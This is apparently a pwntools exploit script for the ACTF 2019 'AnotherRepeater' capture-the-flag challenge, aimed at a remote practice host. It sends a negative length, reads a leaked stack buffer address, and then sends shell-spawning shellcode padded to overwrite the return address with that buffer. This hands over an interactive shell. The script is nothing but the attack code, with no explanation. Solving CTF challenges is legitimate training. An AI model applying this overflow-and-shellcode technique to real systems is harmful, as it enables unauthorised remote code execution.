from pwn import *

context(log_level='debug')

#io=process("./ACTF_2019_AnotherRepeater")

io=remote("node3.buuoj.cn",28438)

io.recv()

io.sendline(str(-10))

buf=int(io.recv(8),16)

print(hex(buf))

io.recv()

#main=0x804877d

payload=asm(shellcraft.sh()).ljust(0x41b+0x4,b'A')+p32(buf)

io.sendline(payload)

io.interactive()